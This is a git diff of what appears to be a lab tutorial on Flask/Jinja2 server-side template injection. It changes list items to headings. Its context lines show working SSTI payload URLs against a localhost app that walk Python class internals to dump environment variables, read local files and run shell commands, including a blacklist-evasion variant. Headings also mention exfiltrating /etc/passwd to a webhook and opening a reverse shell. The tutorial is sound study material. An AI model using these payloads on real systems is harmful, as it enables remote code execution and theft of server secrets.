@@ -18,7 +18,7 @@ if __name__ == "__main__":
     app.run()
 ```
 
-- Return the index of urllib in subclasses()
+- ## Return the index of urllib in subclasses()
   
 ```http://127.0.0.1:5000/?c={{().__class__}}``` : ```<class 'tuple'>``` : class method returns the class of the object that is an empty tuple over here
 
@@ -49,7 +49,7 @@ FOR BLACKLIST:
 http://127.0.0.1:5000/?c={{%20(dict.mro()[-1]|attr(%22\x5f\x5fsubclasses\x5f\x5f%22))()%20}}
 ```
 
-- Get name of current python flask script
+- ##  Get name of current python flask script
 
 
 - Get all the current envvars
@@ -64,7 +64,7 @@ http://127.0.0.1:5000/?c={{config.__class__.from_envvar[%22__globals__%22][%22__
 ```
 ![image](https://github.com/poorvi1910/Web/assets/146640913/de0b5534-d6a5-41aa-9c42-c4d4493f7a61)
 
-- Read a local file
+- ##  Read a local file
 
 ```http://127.0.0.1:5000/?c={{%20request.__class__}}``` : ```<class 'flask.wrappers.Request'>```
 
@@ -81,7 +81,7 @@ http://127.0.0.1:5000/?c={{%20request.__class__._load_form_data.__globals__.__bu
 ![image](https://github.com/poorvi1910/Web/assets/146640913/dba77ed3-b558-41bc-8740-12d3d668d256)
 
 
-- Run a command
+- ##  Run a command
 
 ```http://127.0.0.1:5000/?c={{().__class__}}``` : ```<class 'tuple'>``` : class method returns the class of the object that is an empty tuple over here
 
@@ -95,7 +95,7 @@ http://127.0.0.1:5000/?c={{().__class__.__mro__[1].__subclasses__()[568](%27cat%
 ```
 ![image](https://github.com/poorvi1910/Web/assets/146640913/a516db8b-213f-4e58-8650-585cac3a95de)
 
-- Send the contents of etc pass to  awebhook
+- ##  Send the contents of etc pass to  awebhook
 
 
 - Create a reverse shell, save your work and run the command yes on the rev shell
